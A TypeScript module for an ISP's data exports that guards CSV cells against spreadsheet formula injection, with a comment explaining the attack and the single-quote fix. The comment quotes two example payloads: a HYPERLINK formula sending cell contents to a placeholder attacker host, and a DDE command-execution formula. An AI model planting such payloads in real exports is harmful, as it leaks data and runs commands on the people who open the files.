/**
 * CSV FORMULA INJECTION — THE ONE PLACE A CELL IS MADE SAFE.
 *
 * ── The attack ───────────────────────────────────────────────────────────
 * A CSV cell is text to the file and a FORMULA to the spreadsheet that opens
 * it. Excel and LibreOffice both evaluate any cell whose first character is
 * `=`, `+`, `-`, `@`, and (Excel) a leading tab or carriage return.
 *
 * Nothing about that is theoretical here. A subscriber's name, a ticket
 * subject, a device description and an address are all attacker-supplied
 * strings that an operator later exports and opens. So a customer who signs
 * up as
 *
 *     =HYPERLINK("http://attacker/"&A1,"Click for invoice")
 *
 * has planted a link, rendered by Excel as innocuous blue text, that carries
 * a neighbouring cell's contents to a third party the moment the operator
 * clicks it. `=cmd|'/c calc'!A0` is the same trick aimed at DDE. The victim
 * is the ISP's own staff, on their own machine, opening their own export —
 * a file they have every reason to trust.
 *
 * ── Why the existing escaping did not stop it ────────────────────────────
 * Both writers quoted cells containing a comma, quote or newline. That is
 * correct RFC 4180 escaping and it is orthogonal to this problem: Excel
 * strips the surrounding quotes while parsing and THEN evaluates the
 * content. Quoting changes nothing.
 *
 * ── The fix ──────────────────────────────────────────────────────────────
 * Prefix a single quote. `'` is the spreadsheet's own "this cell is text"
 * marker: Excel and LibreOffice both consume it and display the original
 * string, so `=1+1` shows as `=1+1` rather than `2`. It survives a
 * round-trip through the Import dialog too, because the import parser reads
 * it back as literal text.
 *
 * WHY NOT strip the character, or wrap the cell in quotes: stripping
 * corrupts legitimate data — an ISP with a package called "-2Mbps Burst" or
 * a note starting "@ site visit" would silently lose the first character,
 * and a negative amount `-500` would become `500`, which is worse than the
 * vulnerability. Prefixing preserves every byte.
 *
 * ── What this does NOT cover ─────────────────────────────────────────────
 * Numbers are returned untouched, deliberately. A numeric `-500` is a value,
 * not a string, and quoting it would break every sum in the sheet. The risk
 * only exists for strings, because only a string can carry a payload.
 */

/** Characters a spreadsheet treats as "this cell is a formula". */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * Make one value safe to place in a spreadsheet cell.
 *
 * Returns numbers unchanged. Returns strings unchanged unless they open with
 * a formula character, in which case a single quote is prefixed.
 */
export function csvSafe<T>(value: T): T | string {
  if (typeof value === 'number') return value;
  if (value === null || value === undefined) return value;
  const s = String(value);
  return FORMULA_LEAD.test(s) ? `'${s}` : s;
}

/** True when this value would have been evaluated as a formula. */
export function isFormulaInjection(value: unknown): boolean {
  return typeof value === 'string' && FORMULA_LEAD.test(value);
}
